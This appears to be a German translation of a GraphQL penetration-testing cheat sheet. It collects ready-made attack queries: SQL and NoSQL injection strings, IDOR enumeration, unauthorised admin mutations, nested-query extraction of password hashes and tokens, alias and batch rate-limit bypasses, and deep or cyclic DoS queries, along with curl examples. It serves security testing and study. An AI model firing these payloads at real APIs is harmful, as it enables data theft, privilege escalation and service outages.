# 📊 Spickzettel für GraphQL-Injection

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🔍 GraphQL-Grundlagen

### Häufige Endpunkte
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Aufbau einer Anfrage
```graphql
# Abfrage
{
  user(id: 1) {
    name
    email
  }
}

# Mit Operationsnamen
query GetUser {
  user(id: 1) {
    name
  }
}

# Mutation
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

## 🎯 Introspektionsabfragen

### Vollständige Schema-Introspektion
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Query-Typ (Einstiegspunkte)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Mutation-Typ
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Alle Typen
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Einzelheiten zu einem bestimmten Typ
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

## 💉 Injection-Angriffe

### SQL-Injection über GraphQL
```graphql
# In Argumenten
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# UNION-basiert
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### NoSQL-Injection
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Alternativ als JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (Insecure Direct Object Reference)
```graphql
# Auf Daten anderer Benutzer zugreifen
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Alle Benutzer erfassen
{
  users {
    id
    name
    email
    role
  }
}
```

---

## 🔥 Autorisierung umgehen

### Fehlende Autorisierung bei Mutationen
```graphql
# Administrationsoperationen als normaler Benutzer prüfen
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Umgehung durch verschachtelte Abfragen
```graphql
# Über Beziehungen auf vertrauliche Daten zugreifen
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Missbrauch von Feldvorschlägen
```graphql
# Bei aktivierten Feldvorschlägen ungültige Felder prüfen
{
  user(id: 1) {
    passwor  # Kann "password" vorschlagen
  }
}
```

---

## 🚀 Offenlegung von Informationen

### Debug-Informationen
```graphql
# Fehlerbasierte Erfassung
{
  __typename
}

# Ungültige Abfrage zum Erhalten eines Stacktraces
{
  invalid_field_that_doesnt_exist
}
```

### Vertrauliche Felder ermitteln
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

## 🛡️ Umgehungstechniken

### Alias-basierte Umgehung
```graphql
# Anfrageratenbegrenzung mit Aliasen umgehen
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Angriffe durch gebündelte Abfragen
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Groß- und Kleinschreibung verändern
```graphql
# Andere Groß- und Kleinschreibung prüfen
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Fragment-Injection
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

## 💣 DoS-Angriffe

### Angriff mit stark verschachtelten Abfragen
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Zyklisches Fragment
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Zyklischer Verweis
}
```

### Große Ergebnismenge
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

## 🛠️ Testwerkzeuge

### GraphQL Voyager
```bash
# Schema grafisch darstellen
https://graphql-kit.com/graphql-voyager/
# Introspektionsergebnis einfügen
```

### InQL (Burp-Erweiterung)
```
# Funktionen:
- Schema auslesen
- Abfragen erzeugen
- Schwachstellenscans
```

### graphql-cop
```bash
# Werkzeug für Sicherheitsprüfungen
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# GraphQL-Fingerprinting
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL Client
```
# Desktop-Client für Tests
https://altairgraphql.dev/
```

---

## 📝 cURL-Beispiele

### Einfache Abfrage
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Mit Variablen
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspektion
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Mit Authentifizierung
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

## 📋 Testcheckliste

```markdown
## Checkliste zur GraphQL-Sicherheit

□ GraphQL-Endpunkte ermitteln
□ Introspektion prüfen (Schema auslesen)
□ Alle Abfragen und Mutationen erfassen
□ Objektabfragen auf IDOR prüfen
□ Autorisierung von Mutationen prüfen
□ Argumente auf SQL-/NoSQL-Injection prüfen
□ Verschachtelte Abfragen auf Datenabfluss prüfen
□ Anfrageratenbegrenzung prüfen (Alias-Umgehung)
□ Gebündelte Abfragen prüfen
□ Auf vertrauliche Felder prüfen (password, token)
□ Tiefenbegrenzung prüfen (DoS)
□ Auf Informationsfreigabe durch Fehler prüfen
□ Subscription-Endpunkte prüfen
```

---

## 🔗 Übersicht häufiger Schwachstellen

| Schwachstelle | Prüfung | Auswirkung |
|---------------|------|--------|
| **Introspektion aktiviert** | Abfrage `__schema` | Offenlegung des Schemas |
| **IDOR** | IDs in Abfragen ändern | Auf Daten anderer Benutzer zugreifen |
| **Fehlende Authentifizierung** | Abfrage ohne Token | Unbefugter Zugriff |
| **SQLi/NoSQLi** | Injection in Argumenten | Kompromittierung der Datenbank |
| **Übermäßige Datenfreigabe** | Vertrauliche Felder abfragen | Datenabfluss |
| **DoS** | Tiefe oder zyklische Abfragen | Dienst nicht verfügbar |
| **Missbrauch gebündelter Abfragen** | Mehrere Abfragen | Umgehung der Anfrageratenbegrenzung |

---

## 🔗 Verwandte Payloads

- [SQLi-Payloads](./SQLi.de.md)
- [NoSQL-Injection](./NoSQL-Injection.de.md)
- [API-Sicherheit](../../API-Security/translations/README.de.md)

---

**Zurück zur Payload-Sammlung:** 💉 Payload-Sammlung (im Original verlinkt; `Payloads/README.md` fehlt)

---

---

## Hinweise zur deutschen Ausgabe

> **Schema und Validierung:** Introspektion ist eine GraphQL-Funktion und allein kein Beweis einer Sicherheitslücke. Feldnamen sind groß-/kleinschreibungsabhängig; abweichende Schreibweisen sind keine allgemeine Autorisierungsumgehung. Zyklische Fragmentverweise sind nach der GraphQL-Validierung unzulässig. Das entsprechende DoS-Beispiel sollte bei korrekter Validierung abgewiesen werden. [GraphQL-Spezifikation: Validierung](https://spec.graphql.org/October2021/#sec-Validation).

> **Prüfgrenzen:** SQL-/NoSQL-Injection setzt eine unsichere Weiterverarbeitung im Resolver oder Backend voraus; GraphQL selbst führt die gezeigten Zeichenfolgen nicht als SQL aus. Alias- und Batch-Verhalten hängt von Implementierung und Begrenzungen ab. Beispielabfragen benötigen das passende Schema, Feldtypen und Rechte. Ein Fehler, Feldvorschlag oder erreichbarer Endpunkt belegt für sich keine unbefugte Datenfreigabe. Alle Queries und Werte bleiben unverändert.
